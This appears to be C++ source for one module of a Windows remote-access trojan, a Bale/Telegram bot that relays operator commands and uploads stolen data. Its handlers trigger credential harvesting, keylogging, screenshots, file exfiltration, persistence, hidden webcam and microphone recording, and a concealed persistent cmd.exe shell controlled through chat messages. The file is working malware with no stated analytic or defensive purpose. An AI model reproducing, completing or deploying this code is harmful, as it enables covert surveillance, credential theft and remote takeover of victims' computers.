  if (atomId == 2) {
    DWORD now = GetTickCount();
    if (now - g_LastKeylogSpamTime < 2000) {
      g_KeylogSpamCount++;
      if (g_KeylogSpamCount > 5) {
        if (g_KeylogSpamCount == 6)
          SendTelegramMessage("[Keylogger] Suppressing further spam...");
        return;
      }
    } else {
      g_KeylogSpamCount = 0;
    }
    g_LastKeylogSpamTime = now;
  }

  if (data.find("[SCREENSHOT_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SCREENSHOT_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Screenshot", true);
    SendTelegramMessage("Screenshot queued.");
  } else if (data.find("[EXFIL_READY]") == 0) {
    std::string pathA = data.substr(strlen("[EXFIL_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Exfiltrated file", true);
    SendTelegramMessage("File queued.");
  } else if (data.find("[FS_READY]") == 0) {
    std::string pathA = data.substr(strlen("[FS_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Scan Results (Full)", true);
    SendTelegramMessage("Scan report queued.");
  } else if (data.find("[FS_FLUSH_READY]") == 0) {
    std::string pathA = data.substr(strlen("[FS_FLUSH_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Scan Results (Partial Flush)", false);
    SendTelegramMessage("Partial scan report queued.");
  } else if (data.find("[SPY_CAM_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SPY_CAM_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Spy Cam Snapshot", true);
  } else if (data.find("[SPY_MIC_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SPY_MIC_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    UploadFileToTelegram(path, "Spy Mic Recording (30s)", true);
  } else if (data.find("[ERROR]") == 0 || data.find("[FATAL]") == 0 || data.find("[WARN]") == 0) {
    char header[64];
    sprintf_s(header, "⚠️ Atom Alert (%lu):\n", atomId);
    SendTelegramMessage(std::string(header) + data);
  } else if (data.find("PONG|") == 0) {
    long long pongTime = atoll(data.substr(5).c_str());
    if (g_llPingStartTime > 0) {
      if (g_llPingFrequency == 0) QueryPerformanceFrequency((LARGE_INTEGER*)&g_llPingFrequency);
      
      double latencyMs = (double)(pongTime - g_llPingStartTime) * 1000.0 / (double)g_llPingFrequency;
      if (latencyMs < 0) latencyMs = 0; // Shield against clock drift

      char report[128];
      sprintf_s(report, "🏓 Pong! Latency: %.2f ms", latencyMs);
      SendTelegramMessage(report);
      g_llPingStartTime = 0; // Reset
    } else {
      SendTelegramMessage("🏓 Pong received! (Target is alive)");
    }
  } else if (data.find("[SCREENSHOT_DATA]") == 0) {
    SendTelegramMessage("Screenshot captured via C2 Console.");
  } else {
    // Prevent raw binary chunks (e.g. C2 screenshot data) from being sent as text
    int nonPrintable = 0;
    for (size_t i = 0; i < data.length() && i < 128; i++) {
      unsigned char c = (unsigned char)data[i];
      if (c < 32 && c != '\r' && c != '\n' && c != '\t') nonPrintable++;
    }
    if (nonPrintable > 5) {
      DebugLog("[BALE] Ignored binary C2 chunk from Atom %lu", atomId);
      return;
    }

    // Send ALL text reports to Bale — use SendLargeMessage for big ones
    char header[64];
    sprintf_s(header, "Atom %lu report:\n", atomId);
    std::string fullMsg = std::string(header) + data;
    if (fullMsg.length() < 4000) {
      SendTelegramMessage(fullMsg);
    } else {
      // Too long for single message — split or upload as file
      if (fullMsg.length() < 16000) {
        SendLargeMessage(fullMsg);
      } else {
        // Extremely long — upload as text file
        std::string fileName = "atom" + std::to_string(atomId) + "_report_" + std::to_string(GetTickCount()) + ".txt";
        UploadMemoryToTelegram((const BYTE*)fullMsg.c_str(), (DWORD)fullMsg.length(), fileName, "Large report from Atom " + std::to_string(atomId), FALSE);
      }
    }
  }
}

/*===========================================================================
 * Blocking Report Listener Thread (FIX: No polling, reads immediately)
 *===========================================================================*/
DWORD WINAPI ReportListenerThread(LPVOID) {
  DebugLog("[LISTENER] Report listener thread started (non-blocking).");
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(g_hReportPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE msg = {0};
      ULONGLONG start = GetTickCount64();
      if (IPC_ReceiveMessage(g_hReportPipe, &msg, g_SessionKey, 16)) {
        ULONGLONG end = GetTickCount64();
        DebugLog("[TRAFFIC] RECV_MSG | Pipe=Report | Cmd=%d | Size=%lu | Duration=%llums", 
                 msg.CommandId, msg.dwPayloadLen, end - start);
        if (msg.CommandId == CMD_FORWARD_REPORT) {
          std::string data((char *)msg.Payload, msg.dwPayloadLen);
          ProcessForwardedReport(msg.AtomId, data);
        } else if (msg.CommandId == CMD_BALE_REPORT) {
          ProcessBaleReport(msg.AtomId, msg.Payload, msg.dwPayloadLen);
        }
      }
    } else {
      // Check for broken pipe even when no data is available
      DWORD dwState = 0;
      if (!GetNamedPipeHandleState(g_hReportPipe, &dwState, NULL, NULL, NULL, NULL, 0)) {
        if (GetLastError() == ERROR_BROKEN_PIPE) {
          DebugLog("[LISTENER] Pipe broken, exiting.");
          break;
        }
      }
    }
    Sleep(100);
  }
  return 0;
}

DWORD WINAPI CommandListenerThread(LPVOID) {
  DebugLog("[LISTENER] Command listener thread started.");
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(g_hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(g_hCmdPipe, &inMsg, g_SessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          DebugLog("[CMD] Received CMD_EXECUTE from console.");
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          DebugLog("[CMD] Received CMD_TERMINATE. Exiting.");
          ExitProcess(0); // Optional: cleaner exit
        }
      }
    }
    Sleep(500);
  }
  return 0;
}

/*===========================================================================
 * Command Handlers
 *===========================================================================*/
static void HandleHelp(const std::string &args) {
  std::string help = "Commands:\n";
  for (int i = 0; i < g_CommandCount; i++)
    help += std::string(g_Commands[i].name) + " - " +
            g_Commands[i].description + "\n";
  SendLargeMessage(help);
}
static void HandleOnline(const std::string &args) {
  char host[256] = {0}, user[256] = {0};
  DWORD sz = sizeof(host);
  GetComputerNameA(host, &sz);
  sz = sizeof(user);
  GetUserNameA(user, &sz);
  SendTelegramMessage("🟢 Online\nHost: " + std::string(host) +
                      "\nUser: " + std::string(user));
}
static void HandleSysinfo(const std::string &args) {
  if (SendSpawnRequest(3, "BALE_RUN"))
    Sleep(100); /* listener will catch report */
}
static void HandleCreds(const std::string &args) {
  if (SendSpawnRequest(13, "BALE_RUN"))
    SendTelegramMessage("Credential harvesting triggered (Bale Direct)...");
}
static void HandleScreenshot(const std::string &args) {
  if (SendSpawnRequest(6, "BALE_RUN"))
    SendTelegramMessage("Screenshot triggered...");
}
static void HandleKeylogStart(const std::string &args) {
  SendSpawnRequest(2, "BALE_START");
  SendTelegramMessage("Keylogger started (Bale Mode).");
}
static void HandleKeylogFlush(const std::string &args) {
  if (SendSpawnRequest(2, "FLUSH"))
    Sleep(100);
}
static void HandleKeylogStop(const std::string &args) {
  SendSpawnRequest(2, "FLUSH"); // Flush one last time
  Sleep(500);
  SendStopRequest(2);
  SendTelegramMessage("Keylogger stopped and flushed.");
}
static void HandleExfil(const std::string &args) {
  if (args.empty())
    SendTelegramMessage("Usage: /exfil <path>");
  else {
    std::string payload = "BALE_" + args;
    SendSpawnRequest(5, payload);
    Sleep(100);
  }
}
static void HandlePersist(const std::string &args) {
  SendSpawnRequest(7, "RUN");
  SendTelegramMessage("Persistence queued.");
}
static void HandleProcList(const std::string &args) {
  if (SendSpawnRequest(8, "RUN"))
    Sleep(100);
}
static void HandleScan(const std::string &args) {
  std::string path = args.empty() ? "C:\\Users" : args;
  if (SendSpawnRequest(9, path)) {
    SendTelegramMessage("Scan started on: " + path);
  }
}
static void HandleScanFlush(const std::string &args) {
  if (SendSpawnRequest(9, "FLUSH"))
    SendTelegramMessage("Scan flush triggered...");
}
static void HandlePing(const std::string &args) {
  LARGE_INTEGER qpc;
  QueryPerformanceCounter(&qpc);
  g_llPingStartTime = qpc.QuadPart;

  if (SendSpawnRequest(11, "RUN"))
    Sleep(100);
}
static void HandleShell(const std::string &args) {
  if (args == "stop" || args == "exit" || args == "reset") {
    if (g_hShellProc) {
      TerminateProcess(g_hShellProc, 0);
      CloseHandle(g_hShellProc);
      CloseHandle(g_hShellInW);
      CloseHandle(g_hShellOutR);
      g_hShellProc = NULL;
      g_bShellRunning = false;
      SendTelegramMessage("🐚 Persistent shell terminated.");
    } else {
      SendTelegramMessage("🐚 No shell is currently running.");
    }
    return;
  }

  // Start shell if not running
  if (g_hShellProc == NULL) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hOutW, hInR;
    if (CreatePipe(&g_hShellOutR, &hOutW, &sa, 0) && CreatePipe(&hInR, &g_hShellInW, &sa, 0)) {
      SetHandleInformation(g_hShellOutR, HANDLE_FLAG_INHERIT, 0);
      SetHandleInformation(g_hShellInW, HANDLE_FLAG_INHERIT, 0);

      STARTUPINFOA si = {0};
      si.cb = sizeof(si);
      si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
      si.hStdInput = hInR;
      si.hStdOutput = hOutW;
      si.hStdError = hOutW;
      si.wShowWindow = SW_HIDE;

      PROCESS_INFORMATION pi = {0};
      char cmdLine[] = "cmd.exe";
      if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        g_hShellProc = pi.hProcess;
        CloseHandle(pi.hThread);
        CloseHandle(hOutW);
        CloseHandle(hInR);
        g_bShellRunning = true;
        CreateThread(NULL, 0, PersistentShellReader, NULL, 0, NULL);
        SendTelegramMessage("🚀 Persistent shell started. Send commands with /shell");
      } else {
        SendTelegramMessage("❌ Failed to start persistent shell.");
        return;
      }
    }
  }

  // Write command to shell
  if (g_hShellProc && !args.empty()) {
    std::string fullCmd = args + "\r\n";
    DWORD dwWritten;
    WriteFile(g_hShellInW, fullCmd.c_str(), (DWORD)fullCmd.length(), &dwWritten, NULL);
  } else if (args.empty()) {
     SendTelegramMessage("Usage: /shell <cmd> (Persistent session)");
  }
}
static void HandleAmsiStatus(const std::string &args) {
  if (SendSpawnRequest(4, "BALE_RUN"))
    Sleep(100);
}
static void HandleSetDomain(const std::string &args) {
  if (args.empty()) {
    SendTelegramMessage("Usage: /set_domain <ip>:<port>");
  } else {
    // We package the command for Atom 1 (Net) to catch
    std::string payload = "SET_DOMAIN:" + args;
    SendSpawnRequest(1, payload); 
    SendTelegramMessage("Command sent to update Primary Domain to: " + args);
    Sleep(100);
  }
}
static void HandleSpyCam(const std::string &args) {
    SendSpawnRequest(14, "BALE_CAM");
    SendTelegramMessage("Spy Cam triggered.");
}
static void HandleSpyMic(const std::string &args) {
    std::string payload = "BALE_MIC";
    if (!args.empty()) payload += "_" + args;
    if (SendSpawnRequest(14, payload)) {
        if (!args.empty())
            SendTelegramMessage("🎙 Spy Mic triggered for " + args + " seconds...");
        else
            SendTelegramMessage("🎙 Spy Mic triggered (Default 30s)...");
    }
}
static void HandleSpyBoth(const std::string &args) {
    std::string payload = "BALE_BOTH";
    if (!args.empty()) payload += "_" + args;
    if (SendSpawnRequest(14, payload))
        SendTelegramMessage("📸🎙 Spy Both triggered...");
}
static void HandleStopAtom(const std::string &args) {
  if (args.empty()) {
    SendTelegramMessage("Usage: /stop_atom <id>");
    return;
  }
  int id = atoi(args.c_str());
  if (id < 1 || id > 14) {
    SendTelegramMessage("Invalid atom ID (1-14).");
    return;
  }
  SendStopRequest(id);
  SendTelegramMessage("Stop request sent for Atom " + std::to_string(id));
}
static void HandleListAtoms(const std::string &args) {
  if (SendSpawnRequest(0, "LIST"))
    SendTelegramMessage("Requesting atom list from Orchestrator...");
}
static void HandleLiveScreen(const std::string &args) {
  SendSpawnRequest(6, "BALE_LIVE");
  SendTelegramMessage("📸 Live screen capture started. Use /stop_live screen to stop.");
}
static void HandleLiveMic(const std::string &args) {
  SendSpawnRequest(14, "BALE_LIVE_MIC");
  SendTelegramMessage("🎙️ Live mic recording started (30s clips). Use /stop_live mic to stop.");
}
static void HandleStopLive(const std::string &args) {
  if (args.empty() || args == "screen") {
    QueueAtomCommand(6, "BALE_STOP", 9);
    SendTelegramMessage("⏹️ Live screen stop sent.");
  }
  if (args.empty() || args == "mic") {
    QueueAtomCommand(14, "BALE_STOP", 9);
    SendTelegramMessage("⏹️ Live mic stop sent.");
  }
}

/*===========================================================================
 * Telegram Polling Helpers
 *===========================================================================*/
static bool ParseUpdates(const std::string &response, std::string &outCommand,
                         std::string &outArgs) {
  outCommand.clear();
  outArgs.clear();
  if (response.empty())
    return false;
  size_t maxId = 0, pos = 0;
  while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
    pos += 12;
    size_t end = response.find_first_of(",}", pos);
    if (end == std::string::npos)
      break;
    maxId = max(maxId, std::stoull(response.substr(pos, end - pos)));
    pos = end;
  }
  if (maxId > 0)
    g_LastUpdateId = std::to_string(maxId + 1);

  size_t textPos = response.rfind("\"text\":\"");
  if (textPos == std::string::npos)
    return false;
  size_t start = textPos + 8;
  size_t end = response.find("\"", start);
  if (end == std::string::npos)
    return false;
  std::string text = response.substr(start, end - start);

  size_t escPos = 0;
  while ((escPos = text.find("\\n", escPos)) != std::string::npos) {
    text.replace(escPos, 2, "\n");
    escPos += 1;
  }
  escPos = 0;
  while ((escPos = text.find("\\\"", escPos)) != std::string::npos) {
    text.replace(escPos, 2, "\"");
    escPos += 1;
  }

  text.erase(text.begin(),
             std::find_if(text.begin(), text.end(),
                          [](unsigned char ch) { return !std::isspace(ch); }));
  text.erase(std::find_if(text.rbegin(), text.rend(),
                          [](unsigned char ch) { return !std::isspace(ch); })
                 .base(),
             text.end());

  DebugLog("[POLL] Raw text: '%s'", text.c_str());
  if (!text.empty() && text[0] == '/') {
    size_t spacePos = text.find(' ');
    if (spacePos != std::string::npos) {
      outCommand = text.substr(0, spacePos);
      outArgs = text.substr(spacePos + 1);
      outArgs.erase(
          outArgs.begin(),
          std::find_if(outArgs.begin(), outArgs.end(),
                       [](unsigned char ch) { return !std::isspace(ch); }));
    } else {
      outCommand = text;
    }
    DebugLog("[POLL] Command: '%s', Args: '%s'", outCommand.c_str(),
             outArgs.c_str());
    return true;
  }
  return false;
}

static void SkipOldUpdates() {
  std::wstring basePath =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN));
  std::wstring path = basePath + L"/getUpdates?offset=-1&timeout=1";
  std::string response = HttpGet(path);
  if (response.empty())
    return;
  size_t maxId = 0, pos = 0;
  while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
    pos += 12;
    size_t end = response.find_first_of(",}", pos);
    if (end == std::string::npos)
      break;
    DWORD id = (DWORD)std::stoul(response.substr(pos, end - pos));
    if (id > maxId)
      maxId = id;
    pos = end;
  }
  if (maxId > 0) {
    g_LastUpdateId = std::to_string(maxId + 1);
    DebugLog("[INIT] Skipped old updates. Next offset = %s",
             g_LastUpdateId.c_str());
  }
}

/*===========================================================================
 * Bot Polling Loop
 *===========================================================================*/
static void BotPollLoop() {
  std::wstring basePath =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN));
  while (TRUE) {
    std::wstring path =
        basePath + L"/getUpdates?offset=" +
        std::wstring(g_LastUpdateId.begin(), g_LastUpdateId.end()) +
        L"&timeout=" + std::to_wstring(BALE_POLL_TIMEOUT);
    std::string response = HttpGet(path);
    if (!response.empty()) {
      size_t pos = 0;
      while ((pos = response.find("\"message\":{", pos)) != std::string::npos) {
        // Find the text for THIS message
        size_t textPos = response.find("\"text\":\"", pos);
        if (textPos != std::string::npos) {
          size_t start = textPos + 8;
          size_t end = response.find("\"", start);
          if (end != std::string::npos) {
            std::string text = response.substr(start, end - start);
            // Quick unescape and trim (inline to keep it simple)
            size_t escPos = 0;
            while ((escPos = text.find("\\n", escPos)) != std::string::npos) { text.replace(escPos, 2, "\n"); escPos += 1; }
            escPos = 0;
            while ((escPos = text.find("\\\"", escPos)) != std::string::npos) { text.replace(escPos, 2, "\""); escPos += 1; }
            text.erase(text.begin(), std::find_if(text.begin(), text.end(), [](unsigned char ch) { return !std::isspace(ch); }));
            text.erase(std::find_if(text.rbegin(), text.rend(), [](unsigned char ch) { return !std::isspace(ch); }).base(), text.end());

            if (!text.empty() && text[0] == '/') {
              std::string cmd, args;
              size_t spacePos = text.find(' ');
              if (spacePos != std::string::npos) {
                cmd = text.substr(0, spacePos);
                args = text.substr(spacePos + 1);
                args.erase(args.begin(), std::find_if(args.begin(), args.end(), [](unsigned char ch) { return !std::isspace(ch); }));
              } else {
                cmd = text;
              }
              DebugLog("[POLL] Processing Command: '%s'", cmd.c_str());
              bool found = false;
              for (int i = 0; i < g_CommandCount; i++) {
                if (cmd == g_Commands[i].name) {
                  g_Commands[i].handler(args);
                  found = true;
                  break;
                }
              }
              if (!found) SendTelegramMessage("Unknown command: " + cmd);
            }
          }
        }
        // Move to next message
        pos += 10; 
      }
      // Update offset for next poll
      size_t idPos = 0;
      long long maxId = -1;
      while ((idPos = response.find("\"update_id\":", idPos)) != std::string::npos) {
        idPos += 12;
        size_t idEnd = response.find_first_of(",}", idPos);
        if (idEnd != std::string::npos) {
          long long id = std::stoll(response.substr(idPos, idEnd - idPos));
          if (id > maxId) maxId = id;
        }
      }
      if (maxId != -1) g_LastUpdateId = std::to_string(maxId + 1);
    }
    Sleep(2000);
  }
}

/*===========================================================================
 * Main Entry Point (Dual Pipes)
 *===========================================================================*/
DWORD WINAPI BaleBotAtomMain(LPVOID lpParam) {
  DebugLog("=== Atom 12 Bale Bot Starting (Pull‑Based Version) ===");
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  // Removed global CWD change to prevent breaking other atoms' file IO

  // Connect to command pipe (unused but required for symmetry)
  g_hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!g_hCmdPipe) {
    DebugLog("[WARN] IPC_ConnectToCommandPipe failed: %lu (continuing)",
             GetLastError());
  } else {
    DebugLog("[INIT] Command pipe connected. Handle=%p", g_hCmdPipe);
  }

  // Connect to report pipe (critical)
  g_hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!g_hReportPipe) {
    DebugLog("[FATAL] IPC_ConnectToReportPipe failed: %lu", GetLastError());
    if (g_hCmdPipe)
      CloseHandle(g_hCmdPipe);
    return 1;
  }
  DebugLog("[INIT] Report pipe connected. Handle=%p", g_hReportPipe);

  memcpy(g_SessionKey, Config::PSK_ID, 16);

  SkipOldUpdates();
  HandleOnline("");

  // Start background uploader thread
  CreateThread(NULL, 0, TelegramUploaderThread, NULL, 0, NULL);
  DebugLog("[INIT] Telegram Uploader thread launched.");

  // Start report listener thread (blocking read, no polling)
  CreateThread(NULL, 0, ReportListenerThread, NULL, 0, NULL);
  DebugLog("[LISTENER] Report listener thread launched.");

  // Start command listener thread for manual console triggers
  if (g_hCmdPipe) {
    CreateThread(NULL, 0, CommandListenerThread, NULL, 0, NULL);
    DebugLog("[LISTENER] Command listener thread launched.");
  }

  BotPollLoop();

  if (g_hCmdPipe)
    CloseHandle(g_hCmdPipe);
  CloseHandle(g_hReportPipe);
  return 0;
}
static void HandleForceStop(const std::string &args) {
  g_ReassemblyBuffers.clear(); // Clear all pending transfers on this side
  IPC_MESSAGE msg = {0};
  msg.dwSignature = 0x534D4952;
  msg.CommandId = CMD_STOP_ALL; 
  msg.AtomId = 0; 
  msg.dwPayloadLen = 0;

  if (IPC_SendMessage(g_hCmdPipe, &msg, g_SessionKey, 16)) {
    SendTelegramMessage("⚠️ *FORCE STOP SENT:* Orchestrator is purging all non-core tasks and clearing the task queue.");
  } else {
    SendTelegramMessage("❌ *ERROR:* Failed to communicate force-stop command to Orchestrator.");
  }
}
